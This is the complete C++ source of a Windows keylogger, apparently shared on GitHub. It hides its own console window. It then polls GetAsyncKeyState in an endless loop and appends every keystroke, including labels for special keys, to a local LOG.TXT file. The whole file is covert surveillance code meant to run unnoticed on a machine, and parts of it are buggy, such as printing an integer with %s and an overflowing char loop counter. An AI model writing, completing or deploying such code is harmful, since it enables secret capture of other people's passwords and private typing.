/*
 * Created By Waleed Zahid (waleedzahid106a)
 * Github: www.github.com/waleedzahid106a
 */

// Include Statments
#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <string>
// Using Standard Namespace
using namespace std;

// Method Definations
int Save(int key_stroke, char *file);
void Stealth();

// Main Method
int main(void){
    Stealth();
    char i;
    
    // Forever While Loop
    while(1){
         for(i = 8; i <= 190; i++){
         	   // Syncing the Keyboard
               if(GetAsyncKeyState(i) == -32767){
               	   // Saving File to Log.txt
                   Save(i, "LOG.TXT");                   
               }      
         }
    }
}

int Save(int key_stroke, char *file){
	// Return 0 on mouse click
    if((key_stroke==1) || (key_stroke==2)){
        return 0;                   
    }
    
    // Open File Logic Here
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    cout<<key_stroke<<endl;
    // Define the Basic Keys
    if(key_stroke==8){
          fprintf(OUTPUT_FILE, "[BACKSPACE]");
    }else if(key_stroke==13){
          fprintf(OUTPUT_FILE, "\n");
    }else if(key_stroke==32){
          fprintf(OUTPUT_FILE, " ");
    }else if(key_stroke==VK_TAB){
          fprintf(OUTPUT_FILE, "[TAB]");
    }else if(key_stroke==VK_SHIFT){
          fprintf(OUTPUT_FILE, "[SHIFT]");
    }else if(key_stroke==VK_CONTROL){
          fprintf(OUTPUT_FILE, "[CONTROL]");
    }else if(key_stroke==VK_ESCAPE){
          fprintf(OUTPUT_FILE, "[ESCAPE]");
    }else if(key_stroke==VK_HOME){
          fprintf(OUTPUT_FILE, "[HOME]");
    }else if(key_stroke==VK_LEFT){
          fprintf(OUTPUT_FILE, "[LEFT]");
    }else if(key_stroke==VK_RIGHT){
          fprintf(OUTPUT_FILE, "[RIGHT]");
    }else if(key_stroke==VK_UP){
          fprintf(OUTPUT_FILE, "[UP]");
    }else if(key_stroke==VK_DOWN){
          fprintf(OUTPUT_FILE, "[DOWN]");
    }else if(key_stroke==VK_HOME){
          fprintf(OUTPUT_FILE, "[HOME]");
    }else if(key_stroke==190||key_stroke==110){
          fprintf(OUTPUT_FILE, ".");
    }else{
       fprintf(OUTPUT_FILE, "%s", &key_stroke);
    }
    fclose(OUTPUT_FILE);
}

// Method for hiding the Window
void Stealth(){
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);     
}
